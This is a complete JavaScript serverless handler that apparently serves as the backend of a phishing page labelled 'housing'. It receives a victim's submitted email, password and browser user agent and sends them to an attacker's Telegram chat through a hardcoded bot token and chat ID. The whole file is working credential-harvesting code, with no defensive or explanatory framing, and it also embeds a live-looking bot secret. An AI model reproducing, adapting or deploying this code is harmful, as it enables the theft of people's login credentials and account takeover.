module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  console.log('bammmmmmmmm')
  const token = '7689579621:AAE5d9HHm6Jpn-aIwX8GVZz8AYtNPKg7sA0';
  const chatId = '892718536';

  try {
    const { email, pass, agent } = req.body;

    const message = `
📩  housing

📧 Email: ${email}
🔑 Pass: ${pass}
🖥️ Agent: ${agent}
    `;

    const tgRes = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    const data = await tgRes.json();

    return res.status(200).json({
      ok: true,
      telegram: data
    });

  } catch (err) {
    return res.status(500).json({
      error: 'Server error',
      details: err.message
    });
  }
};
